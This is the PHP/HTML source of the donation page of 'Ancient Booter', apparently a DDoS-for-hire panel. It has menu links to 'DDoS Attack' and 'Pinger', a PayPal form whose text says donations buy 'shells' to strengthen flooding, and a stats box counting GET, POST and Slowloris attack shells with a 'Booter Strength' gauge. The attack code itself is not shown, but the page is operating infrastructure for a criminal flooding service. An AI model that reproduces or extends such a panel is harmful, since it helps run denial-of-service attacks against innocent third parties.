<?php 
include "dbc.php";
include "includes/functions.php";
page_protect();
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Ancient Booter</title>
<!-- Calendar Styles -->
<link href="styles/fullcalendar.css" rel="stylesheet" type="text/css" />
<!-- Fancybox/Lightbox Effect -->
<link href="styles/jquery.fancybox-1.3.4.css" rel="stylesheet" type="text/css" />
<!-- WYSIWYG Editor -->
<link href="styles/wysiwyg.css" rel="stylesheet" type="text/css" />
<!-- Main Controlling Styles -->
<link href="styles/main.css" rel="stylesheet" type="text/css" />
<!-- Blue Theme Styles -->
<link href="themes/blue/styles.css" rel="stylesheet" type="text/css" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /></head>
<body>

<!-- Top header/black bar start -->
	<div id="header">
   <img src="images/logo.png" alt="AdminCP" class="logo" /></div>
 <!-- Top header/black bar end -->   
    
<!-- Left side bar start -->
        <div id="left">
<!-- Left side bar start -->

<!-- Toolbox dropdown start -->
        	<div id="openCloseIdentifier"></div>
            <div id="slider">
                <ul id="sliderContent">
                    <li><a href="hub.php" title="DDoS">DDoS Attack</a></li>
                  <li class="alt"><a href="pinger.php" title="">Pinger</a></li>
                    <li><a href="donate.php" title="">Donate</a></li>
                    <li class="alt"><a href="http://www.hackforums.net/member.php?action=profile&uid=749834" title="">Our HF Account</a></li>
                  <li><a href="logout.php" title="">Log Out</a></li>
                </ul>
                <div id="openCloseWrap">
                    <div id="toolbox">
            			<a href="#" title="Toolbox Dropdown" class="toolboxdrop">Toolbox <img src="images/icon_expand_grey.png" alt="Expand" /></a>
            		</div>
                </div>
            </div>
<!-- Toolbox dropdown end -->   
    	
<!-- Userbox/logged in start -->
            <div id="userbox">
            	<p>Welcome <?php echo $_SESSION['user_name'];?></p>
                <p><span>You are logged in as <?php 
				if($_SESSION['user_level'] == 1) {
				echo 'a Customer';
				}
				 
				if ($_SESSION['user_level'] == 5) {
				echo 'an Administrator';	
				}
				?> </span></p>
                <ul>
                	<li><a href="mailto:ancient-productions@hotmail.com" title="Contact Us"><img src="images/icons/icon_mail.png" alt="Contact Us" /></a></li>
                    <?php 
				if($_SESSION['user_level'] == 1) {
				
				}
				 
				if ($_SESSION['user_level'] == 5) {
					?><li><a href="admin.php" title="Admin CP"><img src="images/icons/icon_cog.png" alt="Configure" /></a></li><?php
				}
				?>
                    <li><a href="logout.php" title="Logout"><img src="images/icons/icon_unlock.png" alt="Logout" /></a></li>
                </ul>
            </div>
<!-- Userbox/logged in end -->  

<!-- Main navigation start -->         
            <ul id="nav">
            	
          <li>
                    <ul class="navigation">
                        <li class="heading selected">Main Controls</li>
                        <li><a href="hub.php" title="">DDoS Attack</a></li>
                        <li><a href="index.php" title="">Home</a></li>
                        <li><a href="mysettings.php" title="">My Account</a></li>
                    </ul>
                </li>
                <li>
                    <a class="collapsed heading">Misc. Controls</a>
                     <ul class="navigation">
                        <li><a href="terms.php" title="">Terms of Use</a></li>
                        <li><a href="mailto:ancient-productions@hotmail.com" title="">Contact Us</a></li>
                        <li><a href="donate.php" title="">Donate</a></li>
                    </ul>
                </li>        
            </ul>
        </div>      
<!-- Main navigation end --> 

<!-- Left side bar start end -->   

<!-- Right side start -->     
        <div id="right">

<!-- Breadcrumb start -->  
          <div id="breadcrumb">
                <ul>	
        			<li><img src="images/icon_breadcrumb.png" alt="Location" /></li>
                    <li><a href="index.php" title="">Home</a></li>
                    <li>/</li>
                    <li class="current">Donate</li>
                </ul>
            </div>
<!-- Breadcrumb end -->  

<!-- Top/large buttons start -->  
            <ul id="topbtns">
            	<li class="desc"><strong>Quick Links</strong><br />Popular shortcuts</li>
                <li></li>
                <li>
                
                <a href="hub.php"><img src="images/icons/attack.png" alt="DDoS" /><br />DDoS Attack</a>
                
                </li>
                <li>
                	<a href="mysettings.php"><img src="images/icons/icon_lrg_user.png" alt="Users" /><br />
                	My Account</a>
                </li>
               
                <li>
                	<a href="chat.php"><img src="images/icons/icon_lrg_comment.png" alt="Comment" /><br />
                	Chat</a>
                </li>
                <li>
                	<a href="support.php"><img src="images/icons/icon_lrg_support.png" alt="Support" /><br />Support</a>
                </li>
                <?php if ($_SESSION['user_level'] == 1){
				}
				else if ($_SESSION['user_level'] == 5) {
					?>
                <li>
                <a href="admin.php"><img src="images/icons/icon_lrg_create.png" alt="Admin CP" /><br />Admin CP</a>
                </li>
				<?php } ?>
            </ul>
<!-- Top/large buttons end -->  

 <!-- Main content start -->      
            <div id="content">

<!-- Charts box start -->          
        		<div class="container med left" id="graphs">
                	<div class="conthead">
                		<h2>Donate</h2>
                    </div>
<!-- Tabbed navigation start -->                    
               	  <div class="contentbox">
                    <p>Please donate to ancient booter so that we can make flooding strong. 100% of donations here go to buying more shells. Click below to make a donation:</p>
                    <p>&nbsp;</p>
                    <p><center><form action="https://www.paypal.com/cgi-bin/webscr" method="post">
<input type="hidden" name="cmd" value="_donations">
<input type="hidden" name="business" value="1domeso@gmail.com">
<input type="hidden" name="lc" value="US">
<input type="hidden" name="item_name" value="Ancient Productions">
<input type="hidden" name="no_note" value="0">
<input type="hidden" name="currency_code" value="USD">
<input type="hidden" name="bn" value="PP-DonationsBF:btn_donateCC_LG.gif:NonHostedGuest">
<input type="image" src="https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif" border="0" name="submit" alt="PayPal - The safer, easier way to pay online!">
<img alt="" border="0" src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif" width="1" height="1">
</form></center></p>
               	  </div> 
                </div>
                
<!-- Website stats start -->               
                <div class="container sml right">
                	<div class="conthead">
                		<h2>Shell Stats</h2>
                    </div>
                	<div class="contentbox">
                    	<ul class="summarystats">
                       	  <li>
                            	<p class="statcount"><?php echo $shellsOnline; ?></p> 
                            	<p>Total Shells</p>
                       	  </li>
                          <li>
                            	<p class="statcount"><?php echo $num_rows; ?></p> <p>GET Shells</p>
                          </li>
                             <li>
                            	<p class="statcount"><?php echo $num_rows2; ?></p> <p>POST Shells</p>
                            </li>
                          <li>
                            	<p class="statcount"><?php echo $num_rows3; ?></p> <p>Slowloris Shells</p>
                          </li>
                          <li>
                            	<p class="statcount"><?php
            if($shellRotation == 0){
				?> <font color="red"> <?php echo '(Off)';
			}
			else{
				
		?> <font color="lime"> <?php	echo '(On)';
			}
			?></font> <?php
			 
            ?></p> <p>Shell Rotation</p>
                          </li>
                        </ul>
                        
                        <p><strong>Booter Strength</strong></p>
                        
                        <table>
                            <tr>
                            <?php if ($shellsOnline >= 1000) { ?>
                            
                                <td width="150"><strong><span class="usagetxt redtxt">Strong</span></strong></td>
                                <td width="500">
                                    <div class="usagebox">
                                        1000+ Shells
                                    </div>
                                </td>
                            
                            <?php
							}
							?>
                            </tr>
                            <tr>
                            <?php if ($shellsOnline < 1000 && $shellsOnline > 500){ ?>
                            
                       
                                <td><strong><span class="usagetxt orangetxt">Medium</span></strong></td>
                                <td>
                                    <div class="usagebox">
                                       501-999 Shells
                                    </div>
                                </td>
                            
                            <?php 
							}
							 ?>
                          </tr>
                             <tr>
                             <?php if ($shellsOnline <= 500) { ?>
                            
                                <td><strong><span class="usagetxt greentxt">Weak</span></strong></td>
                                <td>
                                    <div class="usagebox">
                                       0-500 Shells
                                    </div>
                                </td>
                            
                            <?php } ?>
                            </tr>
                        </table>
                    </div>
                </div>
<!-- Website stats end -->  
               
                <!-- Clear finsih for all floated content boxes --> <div style="clear: both"></div>
                
<!-- Form elements start --><!-- Form elements end -->  
 
<!-- Gallery start --><!-- Gallery end -->
 
<!-- Generic style tabbing start --><!-- Generic style tabbing start -->  
                
                <!-- Clear finsih for all floated content boxes --><div style="clear: both"></div>
                
<!-- Calendar start -->             
                
          </div>
<!-- Calendar end -->
    
<!-- Table styles start -->           
                
<!-- Table styles end -->  
                
                <!-- Status Bar Start --><!-- Status Bar End -->
                
                 <!-- Red Status Bar Start --><!-- Red Status Bar End -->
                
                <!-- Green Status Bar Start --><!-- Green Status Bar End -->
                
                <!-- Blue Status Bar Start --><!-- Blue Status Bar End -->   
        	</div>
            
<!-- Footer start --> 
          <p id="footer">&copy; Ancient Productions™  </p>
<!-- Footer end -->      
     
        </div>
<!-- Right side end --> 

<script type="text/javascript" src="http://dwpe.googlecode.com/svn/trunk/_shared/EnhanceJS/enhance.js"></script>	
   		<script type='text/javascript' src='http://dwpe.googlecode.com/svn/trunk/charting/js/excanvas.js'></script>
        <script type='text/javascript' src='https://ajax.googleapis.com/ajax/libs/jquery/1.5.1/jquery.min.js'></script>
        <script type='text/javascript' src='https://ajax.googleapis.com/ajax/libs/jqueryui/1.8.6/jquery-ui.min.js'></script>
        <script type='text/javascript' src='js/jquery.fancybox-1.3.4.pack.js'></script>
        <script type='application/javascript' src='js/fullcalendar.min.js'></script>
        <script type='text/javascript' src='js/jquery.wysiwyg.js'></script>
        <script type='text/javascript' src='js/visualize.jQuery.js'></script>
        <script type='application/javascript' src='js/functions.js'></script>
</body>
</html>
